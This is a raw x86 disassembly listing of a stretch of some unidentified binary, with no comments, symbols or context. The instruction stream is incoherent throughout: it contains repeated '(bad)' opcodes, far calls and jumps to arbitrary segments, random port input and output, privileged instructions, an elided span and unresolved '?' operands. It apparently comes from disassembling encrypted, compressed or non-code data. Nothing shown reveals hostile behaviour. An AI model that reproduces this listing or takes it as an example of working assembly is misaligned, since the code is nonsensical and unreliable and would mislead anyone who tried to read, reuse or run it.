  416950:	xor    dh,BYTE PTR [edi-0xaf13ecc]
  416956:	and    al,0xab
  416958:	mov    ah,0x75
  41695a:	mov    al,0x20
  41695c:	mov    edi,DWORD PTR [ecx]
  41695e:	sar    DWORD PTR [ebx+0x38],1
  416961:	pop    ecx
  416962:	inc    ebx
  416963:	cmp    bh,BYTE PTR [edx+0x7d]
  416966:	sbb    al,cl
  416968:	call   0xd3e4:0x76f3166b
  41696f:	rcr    BYTE PTR [ecx],cl
  416971:	push   es
  416972:	or     eax,0x89589d06
  416977:	sti    
  416978:	ins    BYTE PTR es:[edi],dx
  416979:	ds add eax,0x8e1cb4b1
  41697f:	imul   eax,DWORD PTR [ebp+0x77e279b5],0xd2dc6d0d
  416989:	rcl    BYTE PTR [edi],1
  41698b:	or     BYTE PTR [edx],ch
  41698d:	lahf   
  41698e:	push   ebx
  41698f:	or     eax,0x6290a1e8
  416994:	inc    ebp
  416995:	aas    
  416996:	clc    
  416997:	ss xchg edi,eax
  416999:	cmp    dh,dl
  41699b:	mov    edi,0x60c1775a
  4169a0:	cmc    
  4169a1:	ret    
  4169a2:	jmp    0x4ba5:0x5ba69378
  4169a9:	sbb    ebx,edx
  4169ab:	jae    0x4169ee
  4169ad:	shl    dh,cl
  4169af:	ret    
  4169b0:	jg     0x416a1a
  4169b2:	sub    BYTE PTR [edx],0x2f
  4169b5:	sbb    al,0x94
  4169b7:	rcl    BYTE PTR [edi+ecx*8],1
  4169ba:	sahf   
  4169bb:	pop    ecx
  4169bc:	inc    esi
  4169bd:	sbb    cl,ah
  4169bf:	clc    
  4169c0:	or     DWORD PTR [esi],ecx
  4169c2:	iret   
  4169c3:	sbb    eax,0xedd1e86d
  4169c8:	dec    esi
  4169c9:	and    eax,0x8ad1aeb6
  4169ce:	aam    0x89
  4169d0:	retf   
  4169d1:	pop    es
  4169d2:	(bad)  
  4169d3:	mov    esp,DWORD PTR ds:[ecx]
  4169d6:	mov    esi,0xb40ca96e
  4169db:	jp     0x41699b
  4169dd:	push   edi
  4169de:	inc    eax
  4169df:	lock jl 0x4169aa
  4169e2:	adc    esi,DWORD PTR [ebx+0x43f06d46]
  4169e8:	pusha  
  4169e9:	pop    ebp
  4169ea:	push   0x5714f8da
  4169ef:	add    BYTE PTR ds:0x20633f27,bl
  4169f5:	mov    sp,0x44
  4169f9:	shl    BYTE PTR ss:0x55da1c71,0x96
  416a01:	(bad)  
  416a02:	sbb    edi,esp
  416a04:	inc    edx
  416a05:	out    dx,eax
  416a06:	mov    esi,DWORD PTR ds:0xcb353073
  416a0c:	sahf   
  416a0d:	adc    esi,ecx
  416a0f:	jg     0x416a00
  416a11:	inc    eax
  416a12:	cld    
  416a13:	mov    bh,0xa5
  416a15:	sub    ebp,ebp
  416a17:	inc    edi
  416a19:	scas   al,BYTE PTR es:[edi]
  416a1a:	scas   al,BYTE PTR es:[edi]
  416a1b:	popa   
  416a1c:	xor    cl,BYTE PTR [edx+0x70]
  416a1f:	and    eax,0xa2e73ec9
  416a24:	dec    ebp
  416a25:	cmp    eax,0x9790221b
  416a2a:	mov    esi,0x6389b0a2
  416a2f:	retf   0x5257
  416a32:	pop    eax
  416a33:	in     al,dx
  416a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a35:	aas    
  416a36:	(bad)  
  416a37:	mov    dh,0x39
  416a39:	ror    bh,0x1e
  416a3c:	and    al,0xb6
  416a3e:	in     al,0x54
  416a40:	push   eax
  416a41:	mov    ecx,0x456dccf6
  416a46:	dec    ebp
  416a47:	aam    0x94
  416a49:	inc    esi
  416a4a:	sub    DWORD PTR [ebp+0x3e],esp
  416a4d:	or     DWORD PTR [esp+ecx*2],edx
  416a50:	jge    0x416ac1
  416a52:	dec    ecx
  416a53:	sahf   
  416a54:	push   ecx
  416a55:	pop    edx
  416a56:	pop    eax
  416a57:	xchg   ebx,eax
  416a58:	test   BYTE PTR [eax-0x77504884],0x8c
  416a5f:	xchg   BYTE PTR [ebp-0x189fd2e1],dh
  416a65:	mov    ebx,DWORD PTR [ebx+0x5e138c20]
  416a6b:	pop    ds
  416a6c:	ins    BYTE PTR es:[edi],dx
  416a6d:	add    eax,0xf7157de4
  416a72:	pop    esp
  416a73:	mov    edx,0xa7341cda
  416a78:	mov    eax,0x6f989c1f
  416a7d:	sbb    al,0x6
  416a7f:	ja     0x416a21
  416a81:	dec    edx
  416a82:	and    esp,esp
  416a84:	add    DWORD PTR [edx+edi*8+0x2dcd7476],esi
  416a8b:	lods   eax,DWORD PTR ds:[esi]
  416a8c:	sahf   
  416a8d:	cmp    eax,0x3fa5d5d6
  416a92:	xchg   edi,eax
  416a93:	mov    ecx,esp
  416a95:	cdq    
  416a96:	rcl    esp,1
  416a98:	das    
  416a99:	pop    esp
  416a9a:	lds    eax,FWORD PTR [edi]
  416a9c:	cli    
  416a9d:	fs dec esi
  416a9f:	pushf  
  416aa0:	or     al,ah
  416aa2:	adc    dh,BYTE PTR [edx-0x4]
  416aa5:	mov    ecx,0xa755250a
  416aaa:	xor    eax,0xd5c0cf48
  416aaf:	mov    eax,0x1ec49416
  416ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab5:	shl    BYTE PTR [edx-0x3b5289b7],0x4d
  416abc:	xchg   esi,eax
  416abd:	lahf   
  416abe:	sub    ebx,edi
  416ac0:	ds push 0xffffffc7
  416ac3:	retf   0x9c5f
  416ac6:	pop    edx
  416ac7:	cld    
  416ac8:	cli    
  416ac9:	daa    
  416aca:	xchg   esi,eax
  416acb:	inc    ebx
  416acc:	or     BYTE PTR [edi+ecx*4],0xa7
  416ad0:	(bad)  
  416ad1:	inc    ebp
  416ad2:	mov    eax,0x325d0b37
  416ad7:	out    dx,al
  416ad8:	mov    bh,BYTE PTR [eax]
  416ada:	pop    es
  416adb:	xchg   ebx,eax
  416adc:	ss sub eax,0xe6b2dfb7
  416ae2:	dec    esp
  416ae3:	test   DWORD PTR [ebx-0x50],esi
  416ae6:	test   eax,0x699f44a9
  416aeb:	pop    edx
  416aec:	xor    BYTE PTR [ebp+0x64be264f],cl
  416af2:	mov    WORD PTR [ebp+0x4c],es
  416af5:	sbb    al,0x45
  416af7:	mov    dh,0xbf
  416af9:	jp     0x416b27
  416afb:	test   DWORD PTR [ebx+eax*2-0x6acffb29],edx
  416b02:	xor    dl,BYTE PTR [ebx]
  416b04:	inc    ebp
  416b05:	cmp    ah,BYTE PTR es:[edi+ecx*4-0x2d]
  416b0a:	(bad)  [edi]
  416b0c:	jne    0x416b6c
  416b0e:	and    esp,DWORD PTR [edx-0x57]
  416b11:	push   0xffffffac
  416b13:	inc    ebp
  416b14:	shr    BYTE PTR [esi],cl
  416b16:	mov    esp,0x75f43054
  416b1b:	(bad)  
  416b1c:	loop   0x416b67
  416b1e:	mov    esi,0x7456bfab
  416b23:	mov    cl,0x18
  416b25:	push   0xffffffd4
  416b27:	cmp    al,bh
  416b29:	sbb    BYTE PTR [edx],bl
  416b2b:	dec    ecx
  416b2c:	lock mov al,0x9d
  416b2f:	cs push ecx
  416b31:	pop    esi
  416b32:	in     eax,dx
  416b33:	inc    eax
  416b34:	call   0x81d2c1d6
  416b39:	repnz ins BYTE PTR es:[edi],dx
  416b3b:	xchg   eax,esi
  416b3d:	lea    ecx,[eax+0x78d8dfc5]
  416b43:	je     0x416bb4
  416b45:	rol    edx,1
  416b47:	mov    dh,0x7c
  416b49:	ror    DWORD PTR [ecx],1
  416b4b:	xchg   edx,eax
  416b4c:	imul   edi,DWORD PTR ds:0x7f692916,0xa
  416b53:	fld    TBYTE PTR [eax]
  416b55:	pop    edi
  416b56:	xchg   esi,eax
  416b57:	repnz data16 sti 
  416b5a:	pushf  
  416b5b:	inc    esp
  416b5c:	pop    ebx
  416b5d:	and    esp,DWORD PTR [edx+0x3b]
  416b60:	ds pop ecx
  416b62:	fsubr  QWORD PTR [ecx]
  416b64:	mov    eax,0xbc4635c7
  416b69:	add    BYTE PTR ds:0x53c8a3d6,bl
  416b6f:	and    DWORD PTR [ebp+0x28],0xa46fd02c
  416b76:	or     al,0x44
  416b78:	in     al,dx
  416b79:	or     ebp,DWORD PTR [bx]
  416b7c:	or     eax,ebp
  416b7e:	ja     0x416b6b
  416b80:	fisttp QWORD PTR [esi+0x5b]
  416b83:	or     ch,ch
  416b85:	adc    DWORD PTR [edx],ebp
  416b87:	shl    edx,cl
  416b89:	shl    DWORD PTR [ecx-0x2e1ae760],cl
  416b8f:	push   ds
  416b90:	jecxz  0x416bb0
  416b92:	jmp    0x416bec
  416b94:	and    bh,BYTE PTR [esi+0x671781d4]
  416b9a:	inc    ebx
  416b9b:	dec    ebx
  416b9c:	push   ebx
  416b9d:	pop    edx
  416b9e:	pop    ds
  416b9f:	out    dx,eax
  416ba0:	mov    ebp,0xa5f3810f
  416ba5:	push   ecx
  416ba6:	mov    bh,0xd6
  416ba8:	mov    ebp,0xb5278345
  416bad:	dec    ecx
  416bae:	ins    BYTE PTR es:[edi],dx
  416baf:	xlat   BYTE PTR ds:[ebx]
  416bb0:	jno    0x416bda
  416bb2:	and    BYTE PTR [esi+edi*8+0x4cf06a71],0x94
  416bba:	call   0x90b83fe0
  416bbf:	test   eax,0x9a70d2fd
  416bc4:	and    BYTE PTR es:[ebx+ebp*8-0x3d],dh
  416bc9:	xchg   edi,eax
  416bca:	sbb    DWORD PTR [esi],0xffffffd2
  416bcd:	rcr    DWORD PTR [eax],cl
  416bcf:	mov    esi,0x25aed349
  416bd4:	inc    esi
  416bd5:	jp     0x416bc8
  416bd7:	mov    ecx,0x44033510
  416bdc:	iret   
  416bdd:	mov    bl,0xfe
  416bdf:	mov    eax,ds:0xfb75d266
  416be4:	(bad)  
  416be5:	mov    bh,0x28
  416be7:	or     edi,esp
  416be9:	inc    ecx
  416bea:	aaa    
  416beb:	gs jp  0x416bca
  416bee:	je     0x416b8a
  416bf0:	adc    eax,0x2fc7badd
  416bf5:	cli    
  416bf6:	xchg   ebx,eax
  416bf7:	retf   0x8f9f
  416bfa:	fst    QWORD PTR [esi]
  416bfc:	cwde   
  416bfd:	adc    al,BYTE PTR [esi+0x34f3cbc2]
  416c03:	ins    DWORD PTR es:[edi],dx
  416c04:	sti    
  416c05:	stc    
  416c06:	lock fs cdq 
  416c09:	mov    ebp,ecx
  416c0b:	and    BYTE PTR [edx+0xfff3dab],ah
  416c11:	xchg   esi,eax
  416c12:	mov    edi,0x35e54a24
  416c17:	ja     0x416c77
  416c19:	xchg   edi,eax
  416c1a:	add    BYTE PTR gs:[eax+0x40],dl
  416c1e:	add    BYTE PTR [ecx-0x7daacd85],bh
  416c24:	pop    ss
  416c25:	stc    
  416c26:	test   eax,0x40227a27
  416c2b:	arpl   WORD PTR [ecx-0x18599ab4],cx
  416c31:	add    al,0xf
  416c33:	jmp    DWORD PTR ds:0x88577896
  416c39:	ret    
  416c3a:	push   cs
  416c3b:	xchg   edx,eax
  416c3c:	mov    fs,edi
  416c3e:	cdq    
  416c3f:	out    dx,eax
  416c40:	mov    ah,0x91
  416c42:	les    ecx,FWORD PTR [edx]
  416c44:	call   0x333d:0xfdcaee36
  416c4b:	jecxz  0x416c56
  416c4d:	mov    ecx,0xb09432e6
  416c52:	xlat   BYTE PTR ds:[ebx]
  416c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c54:	fmulp  st(5),st
  416c56:	and    al,0x17
  416c58:	test   eax,0xf4ccd5cd
  416c5e:	mov    eax,ds:0x450b72a1
  416c63:	push   ebx
  416c64:	ins    DWORD PTR es:[edi],dx
  416c65:	xor    al,0x12
  416c67:	jecxz  0x416cdc
  416c69:	sbb    ebx,ebp
  416c6b:	dec    ebp
  416c6c:	mov    ah,0xda
  416c6e:	(bad)  
  416c71:	aas    
  416c72:	mov    ebp,0xa95edd2
  416c77:	(bad)
  416c7a:	out    0xb7,eax
  416c7c:	ror    ebp,0xc4
  416c7f:	sub    eax,0xb07015f0
  416c84:	scas   eax,DWORD PTR es:[edi]
  416c85:	pop    esi
  416c86:	leave  
  416c87:	(bad)  
  416c88:	std    
  416c89:	xchg   DWORD PTR [ebp+eiz*2+0x4d],esp
  416c8d:	xor    bh,BYTE PTR [edx-0x4]
  416c90:	cmp    BYTE PTR [ebx],dh
  416c92:	addr16 jmp 0x416c98
  416c95:	lahf   
  416c96:	push   0x8ab208
	...
  416d13:	add    BYTE PTR [ecx],bl
  416d15:	je     0x416ce6
  416d17:	(bad)  
  416d18:	out    dx,eax
  416d19:	(bad)  
  416d1a:	cmp    esi,esi
  416d1c:	repnz sahf 
  416d1e:	mov    ebx,0x78726d23
  416d23:	loop   0x416d3c
  416d25:	adc    DWORD PTR [ecx],eax
  416d27:	add    BYTE PTR [esi+0x7],ch
  416d2a:	add    BYTE PTR [eax],al
  416d2c:	jo     0x416d71
  416d2e:	test   al,0xd0
  416d30:	into   
  416d31:	mov    edx,0x6ea026
  416d36:	inc    edi
  416d37:	(bad)  
  416d38:	push   0x80f1c37c
  416d3d:	xor    dl,BYTE PTR [esi+0x4b2da787]
  416d43:	sbb    ebx,DWORD PTR [esi]
  416d45:	sti    
  416d46:	inc    eax
  416d47:	ret    0x9de0
  416d4a:	add    eax,DWORD PTR [ebx]
  416d4c:	sti    
  416d4d:	addr16 mov bl,0x7c
  416d50:	aaa    
  416d51:	mov    eax,0x5dd66a8
  416d56:	mov    DWORD PTR [edx+0x1b],ecx
  416d59:	(bad)  
  416d5a:	inc    ebp
  416d5b:	out    0x6e,al
  416d5d:	aas    
  416d5e:	cs jb  0x416d64
  416d61:	mov    edi,DWORD PTR [edi-0x69e40834]
  416d67:	and    DWORD PTR [edx+eax*4-0x1f],ebp
  416d6b:	push   ecx
  416d6c:	jnp    0x416da0
  416d6e:	fnstenv [ebx-0x3f]
  416d71:	add    al,al
  416d73:	add    esp,eax
  416d75:	mov    al,ds:0xa2f7c46d
  416d7a:	inc    edx
  416d7b:	xor    BYTE PTR [esi],cl
  416d7d:	fwait
  416d7e:	add    esi,eax
  416d80:	push   ds
  416d81:	dec    esp
  416d82:	nop
  416d83:	xchg   esi,eax
  416d84:	aas    
  416d85:	cmc    
  416d86:	ins    BYTE PTR es:[edi],dx
  416d87:	in     eax,0x3f
  416d89:	cld    
  416d8a:	push   cs
  416d8b:	sub    esi,ecx
  416d8d:	pop    ecx
  416d8e:	cld    
  416d8f:	or     dl,BYTE PTR [ebx-0x70]
  416d92:	stc    
  416d93:	test   DWORD PTR [ebx+eax*2],esi
  416d96:	mov    bh,0x76
  416d98:	mov    eax,0x6e889b6d
  416d9d:	sbb    BYTE PTR [ebp+0x55],dh
  416da0:	xchg   BYTE PTR [edi+edi*4-0x2b],cl
  416da4:	dec    esp
  416da5:	cwde   
  416da6:	(bad)  
  416da8:	push   0x5db421bc
  416dad:	out    dx,al
  416dae:	vpsubusb xmm3,xmm2,XMMWORD PTR [esi-0x2fdab9a8]
  416db6:	and    DWORD PTR [edx+0x1c],esp
  416db9:	inc    edi
  416dba:	dec    esp
  416dbb:	retf   0xb7a0
  416dbe:	cmp    edi,ebp
  416dc0:	mov    bh,BYTE PTR [edi]
  416dc2:	adc    cl,0x64
  416dc5:	jbe    0x416d6b
  416dc7:	adc    dh,BYTE PTR gs:[edi-0x5e40070c]
  416dce:	adc    DWORD PTR ds:0x107c65e4,esi
  416dd4:	adc    esp,DWORD PTR [ecx+0x75a25fad]
  416dda:	jmp    0xe002:0xcb3c41b3
  416de1:	jecxz  0x416dda
  416de3:	sub    BYTE PTR [edi+0x50ec586],0x92
  416dea:	leave  
  416deb:	(bad)  
  416dec:	rol    BYTE PTR [edi-0x5b039b],1
  416df2:	ins    BYTE PTR es:[edi],dx
  416df3:	in     eax,0xcf
  416df5:	xor    al,BYTE PTR [eax]
  416df7:	sub    al,0x66
  416df9:	sub    eax,0xd2e9ff6
  416dfe:	mov    WORD PTR [eax+0x6e],?
  416e01:	sbb    eax,0x7d6323e0
  416e07:	ins    BYTE PTR es:[edi],dx
  416e08:	in     eax,0x21
  416e0a:	add    eax,0x5e900423
  416e0f:	rcl    BYTE PTR [esi],cl
  416e11:	xor    al,BYTE PTR ds:[ecx+0x710ec3a3]
  416e18:	sar    BYTE PTR [esi-0x7],1
  416e1b:	mov    ebp,?
  416e1d:	jns    0x416de1
  416e1f:	(bad)  
  416e20:	mov    edx,0x42fa446e
  416e25:	xchg   ecx,eax
  416e26:	dec    edx
  416e27:	repnz (bad) 
  416e2a:	push   es
  416e2b:	push   ds
  416e2c:	loopne 0x416dda
  416e2e:	push   esp
  416e2f:	xor    esp,DWORD PTR [ebx]
  416e31:	bound  esp,QWORD PTR [ecx-0x64]
  416e34:	sub    al,0x3
  416e36:	xchg   ebp,eax
  416e37:	stos   DWORD PTR es:[edi],eax
  416e38:	out    dx,eax
  416e39:	(bad)  
  416e3a:	shl    BYTE PTR [edx],0x2d
  416e3d:	inc    ecx
  416e3e:	sar    BYTE PTR [edx],0xc3
  416e41:	mov    DWORD PTR [edi],0x5360e8f9
  416e47:	out    0x92,al
  416e49:	(bad)  
  416e4a:	jmp    0x4fac:0x89cec979
  416e51:	dec    esp
  416e52:	ret    
  416e53:	lock mov edx,0x7aa6597a
  416e59:	mov    bl,0xc0
  416e5b:	je     0x416e25
  416e5d:	inc    eax
  416e5e:	mov    eax,0x29f9f86f
  416e63:	ins    DWORD PTR es:[edi],dx
  416e64:	jnp    0x416e92
  416e66:	and    bh,0x2
  416e69:	mov    bl,0xfd
  416e6b:	mov    WORD PTR [edx],ss
  416e6d:	in     eax,0xaa
  416e6f:	call   0xab1e8c15
  416e74:	clc    
  416e75:	enter  0xea71,0x7e
  416e79:	xor    ebp,DWORD PTR [esp+eax*8]
  416e7c:	sub    BYTE PTR [ebx],bh
  416e7e:	rcr    DWORD PTR [edi+ecx*2],0x78
  416e82:	cmc    
  416e83:	in     eax,dx
  416e84:	out    0x32,eax
  416e86:	and    eax,0xe944ba63
  416e8b:	mov    BYTE PTR [edx-0x37f4cd82],bh
  416e91:	pop    ds
  416e92:	and    eax,0x55ca2eda
  416e97:	fsubr  st(0),st
  416e99:	sub    BYTE PTR [ebx-0xdaf1766],dh
  416e9f:	inc    edi
  416ea0:	push   ecx
  416ea1:	mov    dl,0xcc
  416ea3:	not    ch
  416ea5:	adc    edx,esp
  416ea7:	imul   ecx,DWORD PTR [ebp-0x34],0xffffffe8
  416eab:	adc    bl,BYTE PTR [ecx+0x1bdbc088]
  416eb1:	ins    BYTE PTR es:[edi],dx
  416eb2:	daa    
  416eb3:	push   ebx
  416eb4:	les    ebp,FWORD PTR [ebp-0x216dcd26]
  416eba:	mul    BYTE PTR [ecx+0x5a]
  416ebd:	enter  0xbdf3,0x65
  416ec1:	loop   0x416e68
  416ec3:	mov    ds:0x1adf70c9,al
  416ec8:	mov    ecx,0xd19e3440
  416ecd:	fadd   st(4),st
  416ecf:	fidiv  WORD PTR [esi-0x48f9ba0a]
  416ed5:	push   ecx
  416ed6:	mov    al,ds:0x4d085a79
  416edb:	jne    0x416f06
  416edd:	aam    0x82
  416edf:	or     BYTE PTR [eax],bh
  416ee1:	push   cs
  416ee2:	gs mov dl,0x24
  416ee5:	int3   
  416ee6:	jg     0x416f42
  416ee8:	push   ss
  416ee9:	xchg   ebx,eax
  416eea:	pushf  
  416eeb:	cwde   
  416eec:	fwait
  416eed:	dec    edi
  416eee:	ins    BYTE PTR es:[edi],dx
  416eef:	inc    edi
  416ef0:	shr    BYTE PTR [eax+0x1],1
  416ef3:	dec    esp
  416ef4:	pop    es
  416ef5:	nop
  416ef6:	mov    ds:0x4ff696d4,al
  416efb:	pop    ss
  416efc:	sub    DWORD PTR [eax+0x6b76b939],esi
  416f02:	call   0xcec1a04e
  416f07:	mov    edx,0xe07b672f
  416f0c:	ss (bad) 
  416f11:	add    DWORD PTR [eax-0x63a7cc7c],ecx
  416f17:	mov    ah,0xae
  416f19:	dec    esp
  416f1a:	(bad)  
  416f1b:	pop    esp
  416f1c:	in     eax,dx
  416f1d:	ficom  DWORD PTR [edi+0x17]
  416f20:	lods   al,BYTE PTR ds:[esi]
  416f21:	and    cx,WORD PTR [ebx+0x7e854f13]
  416f28:	pop    esi
  416f29:	pop    ebx
  416f2a:	sbb    BYTE PTR [esi+0x63d2909e],0x3a
  416f31:	mov    ebp,0xbf594faa
  416f36:	ds push 0x9363f94c
  416f3c:	adc    cl,BYTE PTR [edx+esi*2]
  416f3f:	or     al,0xcb
  416f41:	mov    cl,0xa5
  416f43:	or     BYTE PTR [ecx],cl
  416f45:	cli    
  416f46:	push   ecx
  416f47:	jns    0x416f4d
  416f49:	dec    ebp
  416f4a:	jns    0x416faa
  416f4c:	cmp    BYTE PTR [eiz*1-0x59b853fb],0x43
  416f54:	xor    edx,DWORD PTR [esi+0x35]
  416f57:	or     ecx,DWORD PTR [esp+esi*2]
  416f5a:	iret   
  416f5b:	leave  
  416f5c:	stos   BYTE PTR es:[edi],al
  416f5d:	fwait
  416f5e:	push   ecx
  416f5f:	in     al,dx
  416f60:	push   eax
  416f61:	(bad)  
  416f62:	in     al,dx
  416f63:	sbb    esp,DWORD PTR [edi+0x61019333]
  416f69:	ret    0xa7cf
  416f6c:	lods   al,BYTE PTR ds:[esi]
  416f6d:	sub    eax,0xcad1be8d
  416f72:	sub    ah,BYTE PTR [ecx+0x7]
  416f75:	mov    eax,ds:0xe8f3172d
  416f7a:	and    cl,BYTE PTR [ecx-0x3da57cc]
  416f80:	stos   DWORD PTR es:[edi],eax
  416f81:	xchg   ebp,eax
  416f82:	scas   al,BYTE PTR es:[edi]
  416f83:	lds    ebp,FWORD PTR [ecx]
  416f85:	jnp    0x416f47
  416f87:	mov    edx,0x1223f872
  416f8c:	int    0x36
  416f8e:	adc    eax,0x1d0d1ed8
  416f93:	pop    ds
  416f94:	call   0xe35f:0xf624455a
  416f9b:	mov    edi,0xea8269b1
  416fa0:	jne    0x416f2c
  416fa2:	loopne 0x417011
  416fa4:	jge    0x416fa8
  416fa6:	mov    ah,0x52
  416fa8:	inc    ecx
  416fa9:	ds cdq 
  416fab:	mov    dh,0x9f
  416fad:	lahf   
  416fae:	cmp    ebx,DWORD PTR [ebx+ecx*8+0x61]
  416fb2:	je     0x416fae
  416fb4:	sub    edx,DWORD PTR [esi+0x5d]
  416fb7:	fsub   QWORD PTR [ebp-0x45]
  416fba:	ja     0x41702e
  416fbc:	fs xor bl,0xfc
  416fc0:	push   edi
  416fc1:	popf   
  416fc2:	lock push 0x4553530d
  416fc8:	jp     0x416f70
  416fca:	push   ebx
  416fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fcc:	lods   eax,DWORD PTR ds:[esi]
  416fcd:	out    0x6e,al
  416fcf:	ja     0x416fa3
  416fd1:	outs   dx,DWORD PTR ds:[esi]
  416fd2:	retf   0x2908
  416fd5:	xchg   ebp,ebx
  416fd7:	push   edx
  416fd8:	push   edi
  416fd9:	stos   DWORD PTR es:[edi],eax
  416fda:	je     0x416f8e
  416fdc:	push   esp
  416fdd:	int    0x88
  416fdf:	arpl   WORD PTR [ecx+ebx*8-0x1e3765e4],bp
  416fe6:	std    
  416fe7:	mov    DWORD PTR [ecx],0x1ebccbed
  416fed:	adc    DWORD PTR [edi+ecx*8+0x21fbaa78],ebp
  416ff4:	pop    esp
  416ff5:	call   0xc60c:0x524484c1
  416ffc:	mov    dl,0x39
  416ffe:	sbb    al,0x96
  417000:	cwde   
  417001:	daa    
  417002:	(bad)  
  417003:	scas   eax,DWORD PTR es:[edi]
  417004:	mov    ch,0xf1
  417006:	hlt    
  417007:	jg     0x41706c
  417009:	shl    DWORD PTR [ebx+0x13],cl
  41700c:	fs inc ebx
  41700e:	mov    eax,ebx
  417010:	xchg   esi,eax
  417011:	ror    BYTE PTR [eax],cl
  417013:	mov    ds:0x57579353,al
  417018:	xchg   ebp,eax
  417019:	xchg   BYTE PTR [eax-0x5d],bh
  41701c:	push   edi
  41701d:	(bad)  
  41701e:	xor    eax,0x615d1d49
  417023:	add    BYTE PTR [ecx],0x72
  417026:	shl    bh,0x6f
  417029:	imul   esi,DWORD PTR [ebp+0xd],0xfceca97d
  417030:	test   eax,0xce7bb086
  417035:	push   ecx
  417036:	xor    al,0x5b
  417038:	add    esi,DWORD PTR [edx-0x44]
  41703b:	lods   al,BYTE PTR ds:[esi]
  41703c:	jns    0x417097
  41703e:	rol    BYTE PTR [ebx+0x16a50705],0xe1
  417045:	out    dx,al
  417046:	mov    eax,0x645b92f9
  41704b:	mov    edx,0xf740a2c6
  417050:	inc    edi
  417051:	pop    ds
  417052:	addr16 das 
  417054:	stc    
  417055:	in     al,dx
  417056:	out    0xe1,al
  417058:	(bad)  
  417059:	mov    ds:0x6755c9e9,al
  41705e:	mov    eax,0xafffcf22
  417063:	or     al,0x76
  417066:	mov    edx,0x335c1999
  41706b:	and    eax,0x5430f1a9
  417070:	lods   al,BYTE PTR ds:[esi]
  417071:	pop    ss
  417072:	ret    
  417073:	dec    eax
  417074:	or     ebx,DWORD PTR [ecx]
  417076:	pop    ss
  417077:	out    0xab,eax
  417079:	adc    bh,bh
  41707b:	and    BYTE PTR [edi+0x6e],al
  41707e:	mov    ebx,0xaa4c330e
  417083:	int3   
  417084:	outs   dx,DWORD PTR ds:[esi]
  417085:	pop    ebp
  417086:	test   BYTE PTR [ecx+0xbb5bed2],cl
  41708c:	push   ss
  41708d:	mov    ?,WORD PTR [edi]
  41708f:	jecxz  0x41707d
  417091:	xor    bh,BYTE PTR [ebx]
  417093:	cmp    al,0xd1
  417095:	div    BYTE PTR [eax+0x34a40343]
  41709b:	pop    edx
  41709c:	jmp    0x4170fb
  41709e:	xchg   bh,dh
  4170a0:	test   eax,0xdd420e4c
  4170a5:	adc    al,0xa8
  4170a7:	fnstsw WORD PTR [ebx+0x1d]
  4170aa:	stc    
  4170ab:	sub    dl,BYTE PTR [ecx-0xce5e7c5]
  4170b1:	cli    
  4170b2:	jne    0x4170c0
  4170b4:	(bad)  
  4170b5:	repnz fst QWORD PTR [ebp+0x620d2ca8]
  4170bc:	dec    ecx
  4170bd:	sar    BYTE PTR [eax+0x5991e856],cl
  4170c3:	mov    ebx,0xfc4b98a6
  4170c8:	fld    TBYTE PTR [edi-0x37d23697]
  4170ce:	retf   
  4170cf:	push   ebx
  4170d0:	push   0xffffffdb
  4170d2:	dec    edx
  4170d3:	pop    ebx
  4170d4:	pop    edi
  4170d5:	aaa    
  4170d6:	jns    0x4170bd
  4170d8:	pop    ebp
  4170d9:	jb     0x41711f
  4170db:	add    eax,0x88b9785
  4170e0:	call   0x8a472d54
  4170e5:	loop   0x41713c
  4170e7:	mov    bh,0xb5
  4170e9:	mov    ah,0xb8
  4170eb:	pop    ss
  4170ec:	retf   
  4170ed:	cld    
  4170ee:	ds popf 
  4170f0:	ja     0x417146
  4170f2:	(bad)
  4170f6:	sub    BYTE PTR [esi-0x56],cl
  4170f9:	mov    edi,0xc6579e72
  4170fe:	bound  esp,QWORD PTR [ebx]
  417100:	fsubr  DWORD PTR ds:0xe8ed7374
  417106:	sahf   
  417107:	out    dx,eax
  417108:	dec    ebx
  417109:	cs sti 
  41710b:	rcl    ebx,0x57
  41710e:	sub    edx,edi
  417110:	js     0x4170c0
  417112:	mov    bl,0x8a
  417114:	lods   eax,DWORD PTR ds:[esi]
  417115:	popa   
  417116:	outs   dx,BYTE PTR ds:[esi]
  417117:	cmp    eax,0xac810ac1
  41711c:	dec    edi
  41711d:	mov    ch,0xb3
  41711f:	jo     0x417123
  417121:	shl    DWORD PTR [ecx-0x44],1
  417124:	or     DWORD PTR ds:0x9309b574,0x99928936
  41712e:	cmp    ebp,DWORD PTR [ebx+0x482eded]
  417134:	int3   
  417135:	(bad)  
  417136:	xor    eax,0xd6abf345
  41713b:	xchg   esp,eax
  41713c:	cli    
  41713d:	inc    ebp
  41713e:	adc    dl,BYTE PTR [ecx]
  417140:	add    BYTE PTR [edi-0x69],ch
  417143:	adc    DWORD PTR [ebp-0x56],eax
  417146:	fmul   DWORD PTR [ecx-0x1dd95174]
  41714c:	or     ecx,edx
  41714e:	lods   eax,DWORD PTR ds:[esi]
  41714f:	outs   dx,BYTE PTR ds:[esi]
  417150:	jo     0x41719a
  417152:	(bad)  
  417153:	(bad)  
  417155:	fmul   DWORD PTR [edx+0x49]
  417158:	jle    0x417138
  41715a:	xchg   esp,eax
  41715b:	fild   DWORD PTR [ecx+0x1abd7f48]
  417161:	dec    ecx
  417162:	test   eax,0x767dee3e
  417167:	push   edi
  417168:	pop    es
  417169:	sub    DWORD PTR [eax-0x6e46f915],ecx
  41716f:	push   0xffffffc3
  417171:	icebp  
  417172:	sbb    eax,0xf0843ef7
  417177:	repz sbb ebx,DWORD PTR [eax]
  41717a:	stos   DWORD PTR es:[edi],eax
  41717b:	jmp    0x2c30:0x1806f9dd
  417182:	jne    0x4171aa
  417184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417186:	adc    eax,0x1fd5f6d3
  41718b:	in     al,dx
  41718c:	unpcklps xmm7,XMMWORD PTR [ebx+0x79daebf0]
  417193:	retf   0xf9e4
  417196:	jmp    0xdf15:0xbfa98c42
  41719d:	add    DWORD PTR [ebx-0x76],ebp
  4171a0:	in     eax,0xb
  4171a2:	xor    al,cl
  4171a4:	jg     0x4171bd
  4171a6:	mov    bh,0x7d
  4171a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a9:	xlat   BYTE PTR ds:[ebx]
  4171aa:	loop   0x4171b1
  4171ac:	imul   edx,edx,0xecbc54bf
  4171b2:	test   DWORD PTR [ebp-0x3e],ebx
